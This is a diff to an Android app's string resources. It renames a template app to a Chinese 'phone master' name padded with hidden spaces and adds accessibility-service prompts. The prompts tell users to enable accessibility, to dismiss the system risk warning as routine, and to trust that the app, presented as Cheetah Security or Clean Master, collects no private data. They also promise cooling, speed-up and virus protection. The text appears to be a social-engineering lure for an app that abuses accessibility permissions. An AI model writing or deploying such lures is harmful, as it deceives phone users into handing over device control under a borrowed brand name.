@@ -1,5 +1,23 @@
 <resources>
-    <string name="app_name">DevTemplate</string>
+    <!--    <string name="app_name">&#8194;玄冥壁纸相机</string>-->
+    <string name="app_name">&#160;&#160;玄冥手机大师</string>
+    <!--    <string name="app_name">&#032;玄冥纸相机</string>-->
+    <string name="service_name">玄冥自动服务</string>
+    <string name="accessibility_service_description">"
+点击右上角开启辅助功能↗↗↗
+
+注意：开启时，您会收到系统风险提示，请放心开启
+猎豹安全大师不会收集任何关于您的私人信息
+"</string>
+    <string name="clean_description">"点击右上角开关开启服务↗↗↗
+
+启用后：
+1.为手机快速降温，延长手机寿命；
+2.发现并解决手机卡慢问题；
+3.快速发现垃圾，解决空间不足；
+4.为手机提供病毒实时防护。
+
+注意：开启时您会收到系统风险提示，这是标准流程，请放心点击确认，猎豹清理大师不会收集您的私人信息。"</string>
     <string name="tab_text_1">Tab 1</string>
     <string name="tab_text_2">Tab 2</string>
 </resources>
